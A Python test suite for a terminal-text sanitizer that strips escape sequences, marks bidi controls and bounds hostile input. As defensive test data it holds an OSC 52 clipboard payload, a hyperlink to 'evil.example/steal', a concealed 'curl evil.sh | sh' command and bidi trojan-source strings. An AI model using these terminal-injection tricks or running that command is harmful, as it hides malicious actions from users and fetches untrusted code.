import random
import time

import pytest

from pebble.terminal_text import MAX_HELD_BYTES, project, sanitize

BIDI = [chr(c) for c in (*range(0x202A, 0x202F), *range(0x2066, 0x206A))]
FORBIDDEN = ({chr(c) for c in range(0x20)} - {'\t', '\n'}) | {chr(0x7F)} | {chr(c) for c in range(0x80, 0xA0)} \
    | set(BIDI) | {'‎', '‏', '؜'}


def clean(text):
    return not any(c in FORBIDDEN or 0xE0000 <= ord(c) <= 0xE007F or 0xD800 <= ord(c) <= 0xDFFF for c in text)


def pages(raw, limit, live=False):
    """The paging rule proposed for process_jobs._page: hold, then one bounded unit."""
    out, after = [], 0
    while after < len(raw):
        end = min(len(raw), after + limit)
        view = project(raw[after:end], final=end == len(raw) and not live)
        if not view['consumed_bytes'] and end < len(raw):
            end = min(len(raw), after + MAX_HELD_BYTES + 4)
            view = project(raw[after:end], final=end == len(raw) and not live, first_unit=True)
        assert view['consumed_bytes'] > 0
        assert clean(view['text'])
        out.append(view['text'])
        after += view['consumed_bytes']
    return out


def test_osc52_clipboard_payloads_are_removed():
    for raw in (b'before\x1b]52;c;ZXZpbCBjbGlwYm9hcmQ=\x07after',
                b'before\x1b]52;c;ZXZpbCBjbGlwYm9hcmQ=\x1b\\after',
                'before\u009d52;c;ZXZpbCBjbGlwYm9hcmQ=\u009cafter'.encode()):
        text, removed, held = sanitize(raw)
        assert (text, removed, held) == ('beforeafter', 1, 0)
        assert 'ZXZp' not in text


def test_osc8_hyperlink_targets_are_removed_and_label_kept():
    raw = b'see \x1b]8;id=1;https://evil.example/steal\x1b\\docs\x1b]8;;\x1b\\ now'
    text, removed, _ = sanitize(raw)
    assert text == 'see docs now' and removed == 2
    assert 'evil' not in text


def test_csi_cursor_tricks_cannot_hide_text():
    # A terminal would erase and overwrite the first command and conceal the
    # rest; the projection shows every printable byte instead.
    raw = b'curl evil.sh | sh\x1b[2K\x1b[1G\x1b[1A\x1b7\x1b[8mhidden\x1b[0m\x1b8make test\x1b[?25l\x1b(B\x1bc'
    text, removed, _ = sanitize(raw)
    assert text == 'curl evil.sh | shhiddenmake test'
    assert removed == 10 and clean(text)


def test_csi_sgr_colours_are_stripped_from_ordinary_output():
    text, removed, _ = sanitize(b'\x1b[1;31mFAILED\x1b[0m tests/a.py::t - \x1b[32m1 passed\x1b[m')
    assert text == 'FAILED tests/a.py::t - 1 passed' and removed == 4


def test_control_strings_dcs_sos_pm_apc_are_removed():
    for intro in (b'P', b'X', b'^', b'_'):
        assert sanitize(b'a\x1b' + intro + b'q#0;2;0;0;0\nsecret\x1b\\b')[:2] == ('ab', 1)
    for intro in ('\u0090', '\u0098', '\u009e', '\u009f'):
        assert sanitize(('a' + intro + 'payload\u009cb').encode())[:2] == ('ab', 1)


def test_c0_controls_other_than_tab_and_newline_are_removed():
    text, removed, _ = sanitize(b'a\x00b\x07c\x0bd\x0ce\x1bf\tg\x7fh\x01\x02\x03i\n')
    assert text == 'abcde\tgh' + 'i\n'
    # NUL, BEL, VT, FF, ESC+f (a two-byte escape), DEL and three more C0 controls.
    assert removed == 9


def test_c1_controls_are_removed():
    text, removed, _ = sanitize('x\u0084y\u0085z\u009b31mw\u009c!\u0080'.encode())
    assert text == 'xyzw!' and removed == 5
    # A raw 8-bit C1 byte is not UTF-8: it becomes U+FFFD and is never a control.
    view = project(b'ok\x9b31m')
    assert view['text'] == 'ok�31m' and not view['strict_utf8']


def test_carriage_return_overwrite_keeps_last_segment():
    assert sanitize(b'10%\r50%\r100%\ndone\n') == ('100%\ndone\n', 2, 0)
    assert sanitize(b'one\r\ntwo\r\n')[:2] == ('one\ntwo\n', 0)
    assert sanitize(b'abc\r')[:2] == ('abc', 1)          # nothing overwrote it
    assert sanitize(b'abc\r\r\n')[:2] == ('abc\n', 1)
    assert sanitize(b'abc\rxy\x08\x08\n')[:2] == ('\n', 3)


def test_backspace_is_applied_within_the_line():
    assert sanitize(b'abx\x08c')[:2] == ('abc', 1)
    assert sanitize(b'\x08\x08a')[:2] == ('a', 2)
    assert sanitize(b'ab\n\x08c')[:2] == ('ab\nc', 1)
    assert sanitize(b'pass\x08\x08\x08\x08FAIL')[:2] == ('FAIL', 4)
    assert sanitize('héllo\x08\x08\x08\x08y'.encode())[:2] == ('hy', 4)


def test_bidi_controls_become_visible_markers():
    for c in BIDI:
        text, removed, _ = sanitize(('a' + c + 'b').encode())
        assert text == 'a⟦U+%04X⟧b' % ord(c) and removed == 1
    text, _, _ = sanitize('access granted ‮⁦ // admin⁩'.encode())
    assert '⟦U+202E⟧' in text and '⟦U+2066⟧' in text and clean(text)
    assert sanitize('‎‏؜')[0] == '⟦U+200E⟧⟦U+200F⟧⟦U+061C⟧'
    assert sanitize('x\U000E0041\U000E0042')[0] == 'x⟦U+E0041⟧⟦U+E0042⟧'
    assert project('‮')['bidi_marked'] == 1


def test_backspace_cannot_erase_a_bidi_marker():
    assert sanitize('ab‮\x08')[0] == 'a⟦U+202E⟧'
    assert sanitize('‮\x08\x08\x08')[0] == '⟦U+202E⟧'


def test_incomplete_sequences_are_held_when_not_final():
    assert project(b'abc\x1b[3', final=False) == {
        'text': 'abc', 'controls_removed': 0, 'bidi_marked': 0, 'held_bytes': 3,
        'consumed_bytes': 3, 'strict_utf8': True}
    assert sanitize(b'abc\x1b', final=False) == ('abc', 0, 1)
    assert sanitize(b'abc\x1b]0;tit', final=False) == ('abc', 0, 7)
    assert sanitize(b'abc\x1b]0;title\x1b', final=False) == ('abc', 0, 10)
    assert sanitize('abcé'.encode()[:-1], final=False) == ('abc', 0, 1)
    assert sanitize('ok‮'.encode()[:-1], final=False) == ('ok', 0, 2)
    assert sanitize('ok\u009b'.encode()[:-1], final=False) == ('ok', 0, 1)
    assert sanitize(b'line\r', final=False) == ('line', 0, 1)
    assert sanitize(b'line\r\r', final=False) == ('line', 1, 1)


def test_final_input_never_holds():
    assert sanitize(b'abc\x1b[3') == ('abc', 1, 0)
    assert sanitize(b'abc\xe2\x82') == ('abc�', 0, 0)
    # An unterminated control string reveals its body rather than hiding it.
    assert sanitize(b'ok\x1b]52;c;QUJD') == ('ok52;c;QUJD', 1, 0)


def test_overlong_unterminated_sequence_is_not_held_and_reveals_text():
    body = b'A' * (MAX_HELD_BYTES + 10)
    view = project(b'x\x1b]' + body, final=False)
    assert view['held_bytes'] == 0 and view['text'] == 'x' + body.decode()
    view = project(b'x\x1b[' + b'1;' * MAX_HELD_BYTES, final=False)
    assert view['held_bytes'] == 0 and view['text'] == 'x'


STREAM = ('build \x1b[1;32mOK\x1b[0m café \U0001F600 \x1b]8;;https://example.test/\x1b\\link\x1b]8;;\x1b\\ '
          '‮RLO \x1b]52;c;Y2xpcA==\x07 \x1bPdata\x1b\\ \u009b2K tag\U000E0041 \u009d0;t\u009c end\r\nnext\n').encode()


@pytest.mark.parametrize('limit', [1, 2, 3, 4, 5, 7, 8, 13, 64, 4000])
def test_paged_projection_equals_whole_projection(limit):
    whole = project(STREAM)['text']
    assert ''.join(pages(STREAM, limit)) == whole
    assert whole == 'build OK café \U0001F600 link ⟦U+202E⟧RLO    tag⟦U+E0041⟧  end\nnext\n'


def test_every_split_point_is_held_and_completed():
    whole = project(STREAM)['text']
    for k in range(len(STREAM) + 1):
        first = project(STREAM[:k], final=False)
        assert first['consumed_bytes'] + first['held_bytes'] == k
        assert not first['held_bytes'] or first['held_bytes'] <= MAX_HELD_BYTES
        rest = project(STREAM[first['consumed_bytes']:])
        assert first['text'] + rest['text'] == whole, k


def test_live_tail_is_held_without_progress_claims():
    view = project(b'progress \x1b[3', final=False, first_unit=False)
    assert view['consumed_bytes'] == 9 and view['held_bytes'] == 3
    view = project(b'\x1b[3', final=False, first_unit=True)
    assert view['consumed_bytes'] == 0 and view['held_bytes'] == 3


def test_first_unit_bounds_a_sequence_wider_than_the_page():
    assert project(b'\x1b]0;' + b't' * 100 + b'\x07visible', first_unit=True).items() >= {
        'text': '', 'consumed_bytes': 105, 'controls_removed': 1}.items()
    assert project('\U0001F600rest'.encode(), first_unit=True)['consumed_bytes'] == 4
    assert project(b'\r\nx', first_unit=True)['text'] == '\n'


def test_cancel_and_abort_rules():
    assert sanitize(b'\x1b]0;title\x18visible')[0] == 'visible'      # CAN cancels
    assert sanitize(b'\x1b]0;title\x1a!')[0] == '!'                  # SUB cancels
    assert sanitize(b'\x1b]0;title\nshown')[0] == '\nshown'          # C0 aborts an OSC
    assert sanitize(b'\x1b[1\n2m')[0] == '\n2m'                      # invalid CSI byte aborts
    assert sanitize(b'\x1b\x1b\x1b[31mred')[:2] == ('red', 3)
    assert sanitize(b'\x1b]0;a\x1b]0;b\x07c')[0] == 'c'               # nested OSC aborts the outer


def test_str_input_and_lone_surrogates():
    assert sanitize('plain \x1b[31mtext') == ('plain text', 1, 0)
    view = project('bad \ud800 surrogate')
    assert '�' in view['text'] and clean(view['text']) and not view['strict_utf8']
    with pytest.raises(TypeError):
        sanitize(12)


def test_tabs_unicode_and_empty_input_are_preserved():
    assert sanitize(b'') == ('', 0, 0)
    assert sanitize(b'a\n\n\nb\r\n\nc\x08\n\n') == ('a\n\n\nb\n\n\n\n', 1, 0)
    assert sanitize('a\tb 中文 مرحبا'.encode()) == (
        'a\tb 中文 مرحبا', 0, 0)


def _timed(raw, final=True):
    started = time.perf_counter()
    view = project(raw, final=final)
    return time.perf_counter() - started, view


def test_one_megabyte_random_fuzz_runs_under_a_second():
    rng = random.Random(1405)
    alphabet = b'\x1b[]P\\X^_;0123456789m\x07\x18\r\n\x08\t\xc2\x9b\x9d\x9c\xe2\x80\xae\xf3\xa0\x81 abc'
    for raw in (rng.randbytes(1 << 20), bytes(rng.choice(alphabet) for _ in range(1 << 20))):
        for final in (True, False):
            seconds, view = _timed(raw, final)
            assert seconds < 1.0, seconds
            assert clean(view['text'])
            assert view['consumed_bytes'] + view['held_bytes'] == len(raw)


HOSTILE = {
    'csi_introducers': b'\x1b[' * (1 << 19),
    'osc_introducers': b'\x1b]' * (1 << 19),
    'lone_escapes': b'\x1b' * (1 << 20),
    'bare_crs': b'\r' * (1 << 20),
    'backspace_pairs': b'a\x08' * (1 << 19),
    'backspace_after_long_text': b'x' * (1 << 19) + b'\x08\x00' * (1 << 18),
    'c1_osc_nested': '\u009d'.encode() * (1 << 19),
    'c1_csi_nested': '\u009b'.encode() * (1 << 19),
    'unterminated_dcs': b'\x1bP' + b'x' * (1 << 20),
    'unterminated_osc': b'\x1b]' + b'a' * (1 << 20),
    'long_csi_params': b'\x1b[' + b'1;' * (1 << 19) + b'm',
    'nested_strings': b'\x1bP\x1b]\x1b_\x1bX' * (1 << 17),
    'bidi_flood': '‮'.encode() * (1 << 18),
    'cr_reset_flood': b'ab\r' * (1 << 18),
    'newline_flood': b'\n' * (1 << 20),
    'crlf_flood': b'\r\n' * (1 << 19),
    'line_flood': b'a\n' * (1 << 19),
    'c1_flood': '\u0085'.encode() * (1 << 19),
    'st_flood': b'\x1b\\' * (1 << 19),
}


@pytest.mark.parametrize('name', sorted(HOSTILE))
def test_hostile_sequences_terminate_in_linear_time(name):
    raw = HOSTILE[name]
    for final in (True, False):
        seconds, view = _timed(raw, final)
        assert seconds < 1.0, (name, seconds)
        assert clean(view['text'])
        assert view['consumed_bytes'] + view['held_bytes'] == len(raw)
        assert view['held_bytes'] <= MAX_HELD_BYTES


def test_hostile_pager_makes_progress_on_every_page():
    raw = b'\x1b]' + b'a' * 9000 + b'\x07' + b'\x1b[' + b'1;' * 3000 + b'm' + b'tail'
    text = ''.join(pages(raw, 500))
    assert text.endswith('tail') and clean(text)
